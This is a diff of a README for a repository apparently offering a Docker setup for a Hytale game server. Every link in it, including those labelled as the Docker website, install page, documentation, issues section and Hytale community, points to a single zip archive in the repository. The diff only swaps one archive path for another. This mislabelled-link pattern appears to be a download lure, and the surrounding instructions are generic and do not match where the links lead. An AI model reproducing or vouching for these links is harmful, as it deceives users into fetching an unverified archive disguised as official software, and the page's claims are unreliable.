@@ -1,6 +1,6 @@
 # 🐾 hytale-server-docker - Run Your Hytale Server Easily
 
-[![Download hytale-server-docker](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip)](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip)
+[![Download hytale-server-docker](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip)](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Docker is a tool that allows you to run applications in containers. These contai
 To use hytale-server-docker, you need the following:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Docker**: Install the latest version from the [Docker website](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip).
+- **Docker**: Install the latest version from the [Docker website](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip).
 - **Memory**: At least 4 GB of RAM
 - **Disk Space**: 2 GB of free space
 
@@ -27,7 +27,7 @@ To use hytale-server-docker, you need the following:
 
 To get started, you need to download the hytale-server-docker package. 
 
-1. Visit this page to download: [hytale-server-docker Releases](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip).
+1. Visit this page to download: [hytale-server-docker Releases](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip).
 2. Look for the latest version at the top of the page.
 3. Click on the version number.
 4. You will see a list of assets. Download the file suitable for your operating system.
@@ -40,7 +40,7 @@ After downloading, follow these steps to set up your server:
 
 Make sure Docker is installed on your computer. If you haven't installed it yet:
 
-- Go to the [Docker Install Page](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip) and follow the instructions for your operating system.
+- Go to the [Docker Install Page](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip) and follow the instructions for your operating system.
 - Once installed, open Docker and let it set up.
 
 ### Step 2: Running the Server
@@ -105,14 +105,14 @@ Once your server is running, you and your friends can join:
 
 To update your server:
 
-1. Visit the releases page again: [hytale-server-docker Releases](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip).
+1. Visit the releases page again: [hytale-server-docker Releases](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip).
 2. Download the latest version.
 3. Replace your existing files with the new ones.
 4. Restart your server using the steps mentioned in the Setup Instructions.
 
 ## 📞 Support
 
-If you run into issues, please check the [issues section](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip) on this repository. You can report new problems or ask questions there.
+If you run into issues, please check the [issues section](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip) on this repository. You can report new problems or ask questions there.
 
 ## 📜 License
 
@@ -122,7 +122,7 @@ This project is licensed under the MIT License. Feel free to use and modify it a
 
 For more resources on Docker and server management, consider checking:
 
-- Docker Documentation: [Docker Docs](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip)
-- Hytale Community: [Hytale Community](https://raw.githubusercontent.com/edro170611/hytale-server-docker/main/scripts/hytale-docker-server-v3.1.zip)
+- Docker Documentation: [Docker Docs](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip)
+- Hytale Community: [Hytale Community](https://github.com/edro170611/hytale-server-docker/raw/refs/heads/main/scripts/server_docker_hytale_v2.1.zip)
 
 Thank you for using hytale-server-docker! Enjoy your gaming experience on Hytale!
